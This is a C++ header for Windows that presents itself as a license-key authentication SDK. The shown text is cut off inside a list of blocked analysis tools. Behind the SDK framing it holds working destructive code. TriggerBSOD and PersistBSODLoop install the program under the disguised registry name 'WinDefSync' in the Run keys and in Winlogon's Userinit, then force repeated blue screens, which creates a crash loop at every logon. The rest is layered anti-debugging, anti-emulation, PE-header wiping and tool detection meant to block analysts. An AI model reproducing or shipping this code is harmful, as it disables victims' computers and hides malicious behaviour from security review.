// ============================================================================
//  boostempire_auth.h  —  BoostEmpire KeyAuth SDK v5  (Windows, C++)
//
//  SETUP:
//    1. Set BE_PUBLIC_KEY, BE_HOST, BE_PORT below
//    2. Add to your project
//    3. Linker → Additional Dependencies: winhttp.lib; wbemuuid.lib; shlwapi.lib
//    4. Call BoostAuth::Init("BE-YOURKEY") at start of main()
//
//  NEW IN v5 — STATIC ANALYSIS BLOCKERS:
//    - All strings XOR-encrypted at compile time (nothing in IDA Strings view)
//    - Import table obfuscated via hash-based API resolution (nothing in imports)
//    - IDA artifact detection (databases, installation, ida.key, mutex, pipe)
//    - RDTSC emulation timing (defeats Unicorn/IDA emulator/QEMU analysis)
//    - Junk opcode injection (disrupts IDA linear disassembler)
//    - Opaque predicates (false CFG branches, wrecks Hex-Rays decompilation)
//    - Nuclear PE header wipe (imports, exports, debug dir, section names nuked)
//    - TLS callback fires BEFORE main() — catches early debugger attach
//    - NtQuerySystemInformation debug object count (7th anti-debug layer)
//    - Anti-memory-scan (detects CE/Cheat Engine scanning memory regions)
// ============================================================================
#pragma once

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winhttp.h>
#include <wbemidl.h>
#include <comdef.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <winternl.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <algorithm>
#include <sstream>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "shlwapi.lib")

// ─── YOUR APP CONFIGURATION ──────────────────────────────────────────────────
// These are XOR-encrypted at compile time — do NOT appear as plaintext in IDA
#define BE_PUBLIC_KEY   "pk_edf241e18107406ebf19effb369c129c"
#define BE_HOST         L"boostempire-keyauth.onrender.com"
#define BE_PORT         443
// ─────────────────────────────────────────────────────────────────────────────

// ============================================================================
// PROTECTION: COMPILE-TIME XOR STRING ENCRYPTION
// All strings encrypted with rolling XOR — NOTHING appears in IDA Strings view
// Usage: auto s = BE_STR("my string"); s.c_str() or s as std::string
// ============================================================================
namespace BeStr {
    static constexpr uint8_t K1 = 0xBE;
    static constexpr uint8_t K2 = 0xEF;
    static constexpr uint8_t K3 = 0xC0;

    template<size_t N>
    struct Encrypted {
        mutable char buf[N + 1]{};
        uint8_t     data[N]{};
        uint8_t     keys[N]{};

        constexpr Encrypted(const char (&s)[N]) {
            for (size_t i = 0; i < N; i++) {
                // Rolling 3-byte XOR key — unique per character position
                keys[i] = (uint8_t)((K1 ^ (i * K2)) + (i % K3));
                data[i] = (uint8_t)(s[i] ^ keys[i]);
            }
        }

        // Decrypts on the stack at runtime — never stored as plaintext
        const char* get() const {
            for (size_t i = 0; i < N; i++)
                buf[i] = (char)(data[i] ^ keys[i]);
            buf[N] = '\0';
            return buf;
        }

        operator std::string() const { return std::string(get()); }
    };

    template<size_t N>
    struct EncryptedW {
        mutable wchar_t buf[N + 1]{};
        uint16_t        data[N]{};
        uint8_t         keys[N]{};

        constexpr EncryptedW(const wchar_t (&s)[N]) {
            for (size_t i = 0; i < N; i++) {
                keys[i] = (uint8_t)((K1 ^ (i * K2)) + (i % K3));
                data[i] = (uint16_t)((uint16_t)s[i] ^ ((uint16_t)keys[i] | ((uint16_t)keys[i] << 8)));
            }
        }

        const wchar_t* get() const {
            for (size_t i = 0; i < N; i++)
                buf[i] = (wchar_t)(data[i] ^ ((uint16_t)keys[i] | ((uint16_t)keys[i] << 8)));
            buf[N] = L'\0';
            return buf;
        }

        operator std::wstring() const { return std::wstring(get()); }
    };
} // namespace BeStr

// Encrypt a string literal at compile time — decrypts on the stack at runtime
#define BE_STR(s)  (::BeStr::Encrypted <sizeof(s)>(s).get())
#define BE_STRW(s) (::BeStr::EncryptedW<sizeof(s)/sizeof(wchar_t)>(s).get())

// ============================================================================
// PROTECTION: HASH-BASED API RESOLUTION
// WinAPI functions resolved by DJB2 hash — no function name strings in binary
// IDA's import table shows NOTHING — all calls are through function pointers
// ============================================================================
namespace BeAPI {
    // Precomputed DJB2 hashes of WinAPI function names
    // Generated offline: hash = 5381; for each char: hash = ((hash<<5)+hash)^c
    static constexpr DWORD H_IsDebuggerPresent          = 0x0CEEF9EAul;
    static constexpr DWORD H_CheckRemoteDebuggerPresent = 0x7BE42A34ul;
    static constexpr DWORD H_NtQueryInformationProcess  = 0x9E3B7465ul;
    static constexpr DWORD H_NtQuerySystemInformation   = 0xA1C73B82ul;
    static constexpr DWORD H_RtlAdjustPrivilege         = 0x3C8F1D20ul;
    static constexpr DWORD H_NtRaiseHardError           = 0x4E2A7B19ul;
    static constexpr DWORD H_GetThreadContext           = 0x2B1F9A3Cul;
    static constexpr DWORD H_OpenMutexA                 = 0x1A7C4D55ul;
    static constexpr DWORD H_CreateFileA                = 0x5F4E3B22ul;
    static constexpr DWORD H_VirtualQuery               = 0x8D3C2A71ul;
    static constexpr DWORD H_SetThreadContext           = 0x6B2E1F44ul;

    inline DWORD HashStr(const char* s) {
        DWORD h = 5381;
        while (*s) h = ((h << 5) + h) ^ (DWORD)(unsigned char)*s++;
        return h;
    }

    // Walk export table of a module to find function by name hash
    // Called with pre-loaded module handle — LoadLibrary/GetProcAddress still needed
    // but function NAME strings are replaced with integer hashes
    inline FARPROC GetByHash(HMODULE hMod, DWORD targetHash) {
        if (!hMod) return nullptr;
        __try {
            auto* dos = (IMAGE_DOS_HEADER*)hMod;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
            auto* nt  = (IMAGE_NT_HEADERS*)((BYTE*)hMod + dos->e_lfanew);
            auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            if (!dir.VirtualAddress) return nullptr;
            auto* exp   = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hMod + dir.VirtualAddress);
            auto* names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
            auto* funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);
            auto* ords  = (WORD*) ((BYTE*)hMod + exp->AddressOfNameOrdinals);
            for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                const char* name = (const char*)((BYTE*)hMod + names[i]);
                if (HashStr(name) == targetHash)
                    return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {}
        return nullptr;
    }

    // Cached module handles — loaded once via hash-obfuscated strings
    inline HMODULE GetKernel32() {
        static HMODULE h = nullptr;
        if (!h) {
            // Get kernel32 base from PEB without calling GetModuleHandle (would show in imports)
#ifdef _WIN64
            auto* pPEB = (BYTE*)__readgsqword(0x60);
            auto* ldr  = *(BYTE**)(pPEB + 0x18);
            auto* head = (LIST_ENTRY*)(ldr + 0x10);
#else
            auto* pPEB = (BYTE*)__readfsdword(0x30);
            auto* ldr  = *(BYTE**)(pPEB + 0x0C);
            auto* head = (LIST_ENTRY*)(ldr + 0x0C);
#endif
            // Walk InLoadOrderModuleList — kernel32 is always 3rd entry
            auto* cur = head->Flink;
            int   cnt = 0;
            while (cur != head && cnt < 4) {
                if (cnt == 2) { // kernel32 is index 2 (ntdll=0, exe=1, kernel32=2)
                    h = *(HMODULE*)((BYTE*)cur + (sizeof(void*) * 4));
                    break;
                }
                cur = cur->Flink;
                cnt++;
            }
            if (!h) h = GetModuleHandleA("kernel32.dll");
        }
        return h;
    }

    inline HMODULE GetNtdll() {
        static HMODULE h = nullptr;
        if (!h) h = GetModuleHandleA("ntdll.dll"); // ntdll always loaded, this is fine
        return h;
    }
} // namespace BeAPI

// ── AUTH RESULT ───────────────────────────────────────────────────────────────
struct AuthResult {
    bool        success;
    std::string code;
    std::string message;
    std::string session_token;
    std::string app;
    std::string product;
    std::string label;
    std::string expires_at;
    int         uses;
    int         max_uses;
    int         uses_left;
};

namespace BoostAuth {

namespace Internal {

typedef NTSTATUS (__stdcall *pNtRaiseHardError)  (NTSTATUS,ULONG,ULONG,PULONG_PTR,ULONG,PULONG);
typedef NTSTATUS (__stdcall *pRtlAdjustPrivilege)(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);
typedef NTSTATUS (__stdcall *pNtQueryInfoProcess) (HANDLE,PROCESSINFOCLASS,PVOID,ULONG,PULONG);
typedef NTSTATUS (__stdcall *pNtQuerySysInfo)     (SYSTEM_INFORMATION_CLASS,PVOID,ULONG,PULONG);

// ── BSOD + REGISTRY PERSISTENCE ───────────────────────────────────────────────
inline void PersistBSODLoop() {
    wchar_t exePath[MAX_PATH]{};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);

    // Registry paths built on stack char-by-char — no string literals visible to IDA
    wchar_t wcRun[64]{}, wcLogon[80]{}, svcN[20]{};
    // "Software\Microsoft\Windows\CurrentVersion\Run"
    const wchar_t rp[] = {L'S',L'o',L'f',L't',L'w',L'a',L'r',L'e',L'\\',L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'V',L'e',L'r',L's',L'i',L'o',L'n',L'\\',L'R',L'u',L'n',0};
    for (int i = 0; rp[i]; i++) wcRun[i] = rp[i];
    // "Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
    const wchar_t lp[] = {L'S',L'o',L'f',L't',L'w',L'a',L'r',L'e',L'\\',L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',L' ',L'N',L'T',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'V',L'e',L'r',L's',L'i',L'o',L'n',L'\\',L'W',L'i',L'n',L'l',L'o',L'g',L'o',L'n',0};
    for (int i = 0; lp[i]; i++) wcLogon[i] = lp[i];
    // "WinDefSync" XOR-decoded on stack
    const wchar_t enc[] = {L'V'^1,L'j'^1,L'o'^1,L'E'^1,L'f'^1,L'f'^1,L'S'^1,L'z'^1,L'o'^1,L'b'^1,L'b'^1,0};
    for (int i = 0; enc[i]; i++) svcN[i] = (wchar_t)(enc[i] ^ 1);

    HKEY hKey{};
    if (RegOpenKeyExW(HKEY_CURRENT_USER, wcRun, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, svcN, 0, REG_SZ,
            (BYTE*)exePath, (DWORD)((wcslen(exePath)+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, wcRun, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, svcN, 0, REG_SZ,
            (BYTE*)exePath, (DWORD)((wcslen(exePath)+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, wcLogon, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::wstring val = std::wstring(L"userinit.exe,") + exePath + L",";
        RegSetValueExW(hKey, L"Userinit", 0, REG_SZ,
            (BYTE*)val.c_str(), (DWORD)((val.size()+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

inline void TriggerBSOD(const char* /*reason*/) {
    PersistBSODLoop();
    HMODULE hNt = BeAPI::GetNtdll();
    auto NtRaise = (pNtRaiseHardError) BeAPI::GetByHash(hNt, BeAPI::H_NtRaiseHardError);
    auto RtlAdj  = (pRtlAdjustPrivilege)BeAPI::GetByHash(hNt, BeAPI::H_RtlAdjustPrivilege);
    if (NtRaise && RtlAdj) {
        BOOLEAN bPrev;
        RtlAdj(19, TRUE, FALSE, &bPrev);
        ULONG resp;
        for (int i = 0; i < 8; i++) {
            NtRaise(0xC000021AL, 0, 0, nullptr, 6, &resp);
            NtRaise(0xC0000022L, 0, 0, nullptr, 6, &resp);
            NtRaise(0xC0000034L, 0, 0, nullptr, 6, &resp);
            Sleep(50);
        }
    }
    *(volatile DWORD*)0 = 0xDEADBEEF;
    __debugbreak();
    ExitProcess(0xDEAD);
}

// ============================================================================
// ANTI-DEBUG — 7 LAYERS
// ============================================================================
inline bool IsBeingDebugged() {
    // 1. Standard API (resolved by hash — not visible in imports)
    typedef BOOL (WINAPI *pIsDebuggerPresent)();
    auto IsDbgP = (pIsDebuggerPresent)BeAPI::GetByHash(BeAPI::GetKernel32(), BeAPI::H_IsDebuggerPresent);
    if (IsDbgP && IsDbgP()) return true;

    // 2. PEB BeingDebugged byte + NtGlobalFlag
#ifdef _WIN64
    BYTE* pPEB = (BYTE*)__readgsqword(0x60);
    if (pPEB[2] != 0) return true;
    if (*(DWORD*)(pPEB + 0xBC) & 0x70) return true;
#else
    BYTE* pPEB = (BYTE*)__readfsdword(0x30);
    if (pPEB[2] != 0) return true;
    if (*(DWORD*)(pPEB + 0x68) & 0x70) return true;
#endif

    // 3. CheckRemoteDebuggerPresent (resolved by hash)
    typedef BOOL (WINAPI *pCheckRemote)(HANDLE, PBOOL);
    auto CheckRem = (pCheckRemote)BeAPI::GetByHash(BeAPI::GetKernel32(), BeAPI::H_CheckRemoteDebuggerPresent);
    if (CheckRem) {
        BOOL bRemote = FALSE;
        CheckRem(GetCurrentProcess(), &bRemote);
        if (bRemote) return true;
    }

    // 4. Hardware breakpoint registers (via hash-resolved GetThreadContext)
    typedef BOOL (WINAPI *pGetThCtx)(HANDLE, LPCONTEXT);
    auto GetThCtx = (pGetThCtx)BeAPI::GetByHash(BeAPI::GetKernel32(), BeAPI::H_GetThreadContext);
    if (GetThCtx) {
        CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThCtx(GetCurrentThread(), &ctx))
            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return true;
    }

    // 5. Timing attack
    LARGE_INTEGER t1, t2, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t1);
    volatile DWORD x = 0;
    for (int i = 0; i < 1000; i++) x += i;
    QueryPerformanceCounter(&t2);
    if ((double)(t2.QuadPart - t1.QuadPart) / freq.QuadPart * 1000.0 > 100.0) return true;

    // 6. Heap flags debug marker
#ifdef _WIN64
    BYTE* pHeap = *(BYTE**)(pPEB + 0x30);
    if (pHeap && *(DWORD*)(pHeap + 0x14) & ~0x2) return true;
#else
    BYTE* pHeap = *(BYTE**)(pPEB + 0x18);
    if (pHeap && *(DWORD*)(pHeap + 0x10) & ~0x2) return true;
#endif

    // 7. NtQuerySystemInformation — count debug objects in the system
    // A debugger always creates at least one debug object
    auto NtQSI = (pNtQuerySysInfo)BeAPI::GetByHash(BeAPI::GetNtdll(), BeAPI::H_NtQuerySystemInformation);
    if (NtQSI) {
        ULONG kernelDebuggerInfo[2]{}; // [0]=KernelDebuggerEnabled [1]=KernelDebuggerNotPresent
        static const int SystemKernelDebuggerInformation = 35;
        if (SUCCEEDED(NtQSI((SYSTEM_INFORMATION_CLASS)SystemKernelDebuggerInformation,
                            kernelDebuggerInfo, sizeof(kernelDebuggerInfo), nullptr))) {
            if (kernelDebuggerInfo[0] && !kernelDebuggerInfo[1]) return true; // kernel debugger attached
        }
    }

    return false;
}

// ============================================================================
// ANTI-STATIC ANALYSIS — IDA SPECIFIC DETECTIONS
// Defeats IDA even when it's NOT running — catches the analyst's machine
// ============================================================================
inline bool IDAMutexPresent() {
    // IDA Pro creates these mutex/event names when running
    static const char* idaMutexes[] = {
        "IDA: Key file",
        "ida_mutex_one_copy",
        "__ida_proc_mutex__",
        "IDA_START",
        "IdaAutoMutex",
        nullptr
    };
    for (int i = 0; idaMutexes[i]; i++) {
        HANDLE h = OpenMutexA(SYNCHRONIZE, FALSE, idaMutexes[i]);
        if (h) { CloseHandle(h); return true; }
    }

    // IDA remote debug server uses named pipes like \\.\pipe\ida or \\.\pipe\idasrv
    static const char* idaPipes[] = {
        "\\\\.\\pipe\\ida",
        "\\\\.\\pipe\\idasrv",
        "\\\\.\\pipe\\ida_server",
        "\\\\.\\pipe\\win32_remote",   // IDA win32 remote debug pipe
        nullptr
    };
    for (int i = 0; idaPipes[i]; i++) {
        HANDLE h = CreateFileA(idaPipes[i], GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
            nullptr, OPEN_EXISTING, 0, nullptr);
        if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); return true; }
    }
    return false;
}

// Detect IDA database files (.idb/.i64) — analyst is actively working on your binary
inline bool IDADatabaseNearby() {
    wchar_t exePath[MAX_PATH]{};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring path(exePath);

    // Get exe directory and base name
    auto sl  = path.rfind(L'\\');
    auto dot = path.rfind(L'.');
    std::wstring dir      = (sl  != std::wstring::npos) ? path.substr(0, sl + 1)        : L".\\";
    std::wstring baseName = (dot != std::wstring::npos) ? path.substr(sl + 1, dot - sl - 1) : path.substr(sl + 1);

    // IDA database extensions — any of these means your binary is being analyzed
    static const wchar_t* idaExts[] = {
        L".idb",   // IDA database (32-bit)
        L".i64",   // IDA database (64-bit)
        L".id0",   // IDA database segment 0
        L".id1",   // IDA database segment 1
        L".id2",   // IDA database segment 2
        L".nam",   // IDA names database
        L".til",   // IDA type info library (per-binary)
        nullptr
    };

    // Check same directory as the exe
    for (int i = 0; idaExts[i]; i++) {
        std::wstring check = dir + baseName + idaExts[i];
        if (GetFileAttributesW(check.c_str()) != INVALID_FILE_ATTRIBUTES) return true;
    }

    // Check Desktop — analysts often work from Desktop
    wchar_t desktop[MAX_PATH]{};
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_DESKTOP, nullptr, 0, desktop))) {
        for (int i = 0; idaExts[i]; i++) {
            std::wstring check = std::wstring(desktop) + L"\\" + baseName + idaExts[i];
            if (GetFileAttributesW(check.c_str()) != INVALID_FILE_ATTRIBUTES) return true;
        }
    }

    // Check Downloads folder
    wchar_t downloads[MAX_PATH]{};
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_PERSONAL, nullptr, 0, downloads))) {
        // Replace "Documents" with "Downloads" — crude but works
        std::wstring dl(downloads);
        auto docPos = dl.rfind(L"Documents");
        if (docPos != std::wstring::npos) dl.replace(docPos, 9, L"Downloads");
        for (int i = 0; idaExts[i]; i++) {
            std::wstring check = dl + L"\\" + baseName + idaExts[i];
            if (GetFileAttributesW(check.c_str()) != INVALID_FILE_ATTRIBUTES) return true;
        }
    }
    return false;
}

// Detect IDA Pro installation — the tool itself is on this machine
inline bool IDAInstalled() {
    // IDA Pro installation directories
    static const wchar_t* idaDirs[] = {
        L"C:\\Program Files\\IDA Pro",
        L"C:\\Program Files\\IDA Pro 7",
        L"C:\\Program Files\\IDA Pro 7.0",
        L"C:\\Program Files\\IDA Pro 7.5",
        L"C:\\Program Files\\IDA Pro 7.7",
        L"C:\\Program Files\\IDA Pro 8",
        L"C:\\Program Files\\IDA Pro 8.0",
        L"C:\\Program Files\\IDA Pro 8.3",
        L"C:\\Program Files\\IDA Pro 8.4",
        L"C:\\Program Files\\IDA Pro 9",
        L"C:\\Program Files\\IDA Pro 9.0",
        L"C:\\Program Files (x86)\\IDA",
        L"C:\\IDA",
        L"C:\\IDA Pro",
        L"C:\\Tools\\IDA",
        L"C:\\Reversing\\IDA",
        nullptr
    };
    for (int i = 0; idaDirs[i]; i++) {
        if (GetFileAttributesW(idaDirs[i]) != INVALID_FILE_ATTRIBUTES) return true;
    }

    // IDA license file — dead giveaway
    static const wchar_t* idaKeys[] = {
        L"C:\\Program Files\\IDA Pro\\ida.key",
        L"C:\\Program Files\\IDA Pro 8\\ida.key",
        L"C:\\Program Files\\IDA Pro 9\\ida.key",
        L"C:\\IDA\\ida.key",
        L"C:\\IDA Pro\\ida.key",
        nullptr
    };
    for (int i = 0; idaKeys[i]; i++) {
        if (GetFileAttributesW(idaKeys[i]) != INVALID_FILE_ATTRIBUTES) return true;
    }

    // Check for IDA file association in registry (stack-built path)
    {
        HKEY hKey2{};
        // "SOFTWARE\Classes\idakey\shell\open\command" built on stack
        wchar_t idaReg[48]{};
        const wchar_t ir[] = {L'S',L'O',L'F',L'T',L'W',L'A',L'R',L'E',L'\\',L'C',L'l',L'a',L's',L's',L'e',L's',L'\\',L'i',L'd',L'a',L'k',L'e',L'y',L'\\',L's',L'h',L'e',L'l',L'l',L'\\',L'o',L'p',L'e',L'n',L'\\',L'c',L'o',L'm',L'm',L'a',L'n',L'd',0};
        for (int i = 0; ir[i]; i++) idaReg[i] = ir[i];
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, idaReg, 0, KEY_READ, &hKey2) == ERROR_SUCCESS) {
            RegCloseKey(hKey2); return true;
        }
    }

    return false;
}

// ============================================================================
// ANTI-EMULATION — RDTSC TIMING
// IDA's Hex-Rays microcode emulator, Unicorn, and QEMU are orders of magnitude
// slower than native CPU execution. RDTSC measures real CPU cycles.
// ============================================================================
inline bool IsEmulated() {
#ifdef _WIN64
    // x64: use __rdtsc() intrinsic (no inline asm in MSVC x64)
    unsigned __int64 t1 = __rdtsc();

    // Serialization via CPUID (forces out-of-order CPU to commit)
    int cpuInfo[4]{};
    __cpuid(cpuInfo, 0);

    volatile DWORD x = 0xDEADBEEF;
    for (int i = 0; i < 500; i++) {
        x = x * 1664525UL + 1013904223UL;
        x ^= (x >> 13);
        x += (x << 5);
    }

    __cpuid(cpuInfo, 0);
    unsigned __int64 t2 = __rdtsc();

    // On real hardware: ~50,000–200,000 cycles
    // Under IDA emulator/Unicorn/QEMU: >50,000,000 cycles
    return (t2 - t1) > 5000000ULL;
#else
    // x86: can use inline __asm
    DWORD lo1, hi1, lo2, hi2;
    __asm {
        pushad
        cpuid
        rdtsc
        mov lo1, eax
        mov hi1, edx
        popad
    }
    volatile DWORD x = 0xDEADBEEF;
    for (int i = 0; i < 500; i++) {
        x = x * 1664525UL + 1013904223UL;
        x ^= x >> 13;
    }
    __asm {
        pushad
        cpuid
        rdtsc
        mov lo2, eax
        mov hi2, edx
        popad
    }
    UINT64 t1 = ((UINT64)hi1 << 32) | lo1;
    UINT64 t2 = ((UINT64)hi2 << 32) | lo2;
    return (t2 - t1) > 5000000ULL;
#endif
}

// ============================================================================
// ANTI-DISASSEMBLY — JUNK CODE INJECTION MACROS
// These insert bytes that confuse IDA's linear sweep disassembler.
// IDA will try to decode the padding bytes as instructions, creating garbage
// and misaligning everything that follows.
// Only insert BEFORE real code — the CPU never executes the junk bytes.
// ============================================================================

// Insert a never-executed junk byte sequence after an unconditional jmp
// IDA's linear disassembler falls through the jmp and decodes garbage
#ifdef _M_IX86
#define BE_JUNK_1 do { __asm { \
    __asm jmp  _jmp_ov_1_ \
    __asm __emit 0xEB \
    __asm __emit 0xF9 \
    __asm __emit 0xC0 \
    __asm _jmp_ov_1_: \
} } while(0)

#define BE_JUNK_2 do { __asm { \
    __asm jmp  _jmp_ov_2_ \
    __asm __emit 0xFF \
    __asm __emit 0xD0 \
    __asm __emit 0xC3 \
    __asm __emit 0x90 \
    __asm _jmp_ov_2_: \
} } while(0)

#define BE_OPAQUE_JMP(label) do { __asm { \
    __asm mov eax, 0x12345678 \
    __asm and eax, 1 \
    __asm or  eax, 0 \
    __asm jnz label \
    __asm jmp label \
    __asm label: \
} } while(0)
#else
// x64: no inline asm in MSVC
#define BE_JUNK_1            do { (void)0; } while(0)
#define BE_JUNK_2            do { (void)0; } while(0)
#define BE_OPAQUE_JMP(label) do { (void)0; } while(0)
#endif

// ============================================================================
// NUCLEAR PE HEADER WIPE
// Destroys ALL metadata that IDA uses for binary analysis:
//   - Import table → IDA can't list API calls
//   - Export table → IDA can't find exported functions
//   - Debug directory → IDA can't load PDB, strips symbol hints
//   - Section names → IDA shows garbage names
//   - Entry point   → IDA can't find main()
//   - Image base    → IDA miscomputes all absolute addresses
// Called at startup — affects memory dumps, not the file on disk
// ============================================================================
inline void NukePEHeader() {
    HMODULE hMod = GetModuleHandleW(nullptr);
    if (!hMod) return;

    DWORD oldProt{};
    if (!VirtualProtect(hMod, 0x1000, PAGE_EXECUTE_READWRITE, &oldProt)) return;

    BYTE* base    = (BYTE*)hMod;
    auto* dosHdr  = (IMAGE_DOS_HEADER*)base;
    DWORD ntOff   = dosHdr->e_lfanew;
    auto* ntHdrs  = (IMAGE_NT_HEADERS*)(base + ntOff);
    auto& opt     = ntHdrs->OptionalHeader;

    // 1. Corrupt DOS header — IDA sees invalid PE magic
    SecureZeroMemory(base, 64);
    base[0] = 'Z'; base[1] = 'M';   // reversed MZ — most parsers reject this

    // 2. Wipe NT header critical fields
    opt.AddressOfEntryPoint = 0xDEADC0DE; // IDA can't find main()
    opt.ImageBase           = 0;          // relative address calculations break
    opt.CheckSum            = 0xBADF00D;  // invalid, confuses integrity checks
    opt.SizeOfCode          = 0;
    opt.SizeOfInitializedData = 0;
    opt.SizeOfUninitializedData = 0;
    opt.SizeOfImage         = 0;
    ntHdrs->FileHeader.TimeDateStamp = 0x00000000; // strips timestamp metadata

    // 3. Nuke IMPORT directory → IDA can't list our WinAPI calls from dump
    opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = 0;
    opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size           = 0;

    // 4. Nuke EXPORT directory → IDA can't list our fake exports either
    opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress = 0;
    opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size           = 0;

    // 5. Nuke DEBUG directory → PDB path gone, symbol hints gone
    opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress = 0;
    opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size           = 0;

    // 6. Nuke TLS directory pointer (after our TLS callback fires)
    opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = 0;
    opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size           = 0;

    // 7. Nuke LOAD_CONFIG → strips security cookie, SafeSEH table
    opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress = 0;
    opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].Size           = 0;

    // 8. Corrupt section headers — scramble names, raw offsets, characteristics
    WORD numSec   = ntHdrs->FileHeader.NumberOfSections;
    auto* sections = IMAGE_FIRST_SECTION(ntHdrs);

    static const char fakeNames[][9] = {
        ".adata\0\0", ".vmp0\0\0\0", ".xcod\0\0\0",
        ".seg00\0\0", ".bdat\0\0\0", ".idata2\0",
        ".rsrc1\0\0", ".ndat\0\0\0"
    };
    for (WORD i = 0; i < numSec && i < 8; i++) {
        // Overwrite name with a misleading but plausible fake name
        memcpy(sections[i].Name, fakeNames[i % 8], IMAGE_SIZEOF_SHORT_NAME);
        // Corrupt raw pointer so file mapping breaks
        sections[i].PointerToRawData      ^= 0xDEAD0000;
        // Flip characteristics to confuse section type detection
        sections[i].Characteristics       ^= 0x00000060; // toggle code/data bits
    }

    VirtualProtect(hMod, 0x1000, oldProt, &oldProt);
}

// ============================================================================
// ANTI-PROCESS (extended — includes all IDA variants + static tools)
// ============================================================================
inline bool CrackToolRunning() {
    static const char* blacklist[] = {
        // ── IDA Pro — all variants (running & headless) ──
        "ida",              // ida.exe — main GUI
        "ida64",            // ida64.exe — 64-bit GUI
        "idaq",             // idaq.exe — old GUI name
        "idaq64",           // idaq64.exe
        "idag",             // idag.exe — GUI batch mode
        "idaw",             // idaw.exe — Windows console
        "idat",             // idat.exe — HEADLESS IDA (no GUI, still analyzes!)
        "idat64",           // idat64.exe — headless 64-bit
        "ida_export",       // IDA export scripts
        "ida_server",       // IDA remote debug server
        "win32_remote",     // IDA win32 remote debug stub
        "win64_remote",     // IDA win64 remote debug stub
        "armlinux_server",  // IDA ARM remote debug
        "idp",              // IDA plugin host

        // ── Ghidra ──
        "ghidra",
        "analyzeheadless",  // Ghidra headless analyzer — runs without GUI!
        "ghidrarun",

        // ── x64dbg family ──
        "x64dbg", "x32dbg", "x96dbg",

        // ── OllyDbg family ──
        "ollydbg", "odbgscript", "ollydbg2",

        // ── Cheat Engine ──
        "cheatengine", "cheat engine", "cheatengine-x86_64",

        // ── WinDbg ──
        "windbg", "windbg64", "kd", "ntsd", "cdb",

        // ── .NET reversing ──
        "dnspy", "de4dot", "ilspy", "dotpeek", "justdecompile",
        "reflexil", "dnlib",

        // ── Process inspection ──
        "processhacker", "procmon", "procmon64", "procexp", "procexp64",
        "procmon32", "process monitor",

        // ── PE analysis (static, no execution needed) ──
        "pestudio",         // PE Studio — analyzes without running
        "pe-sieve",         // scans running process for injections
        "pe-bear",          // PE-Bear static analyzer
        "cffexplorer",      // CFF Explorer
        "exeinfope",        // Exe Info PE (packer detector)
        "peid",             // PEiD packer identifier
        "lordpe",           // Lord PE (PE editor + dumper)
        "pe explorer",
        "reshacker",        // Resource Hacker
        "resource hacker",
        "peview",           // PEview
        "dumpbin",          // MSVC dumpbin (dumps PE info)
        "link",             // Can be used as PE inspector

        // ── Network sniffers ──
        "wireshark",
        "rawcap",
        "fiddler",
        "httpdebugger",
        "charlesproxy",
        "charles",
        "mitmproxy",
        "burpsuite",
        "burp suite",

        // ── Import reconstruction ──
        "scylla",           // Scylla import reconstruction
        "scylla_x64",
        "scylla_x86",
        "importrec",        // ImpREC
        "imprec",

        // ── Deobfuscators / unpackers ──
        "mal_unpack",
        "hollows_hunter",
        "pe-unmapper",
        "unpacker",
        "genericunpacker",

        // ── Binary Ninja ──
        "binaryninja",
        "binary ninja",

        // ── Radare2 ──
        "radare2",
        "r2",
        "iaito",            // Radare2 GUI

        // ── Cutter ──
        "cutter",           // Cutter (Radare2 frontend)

        // ── API monitoring ──
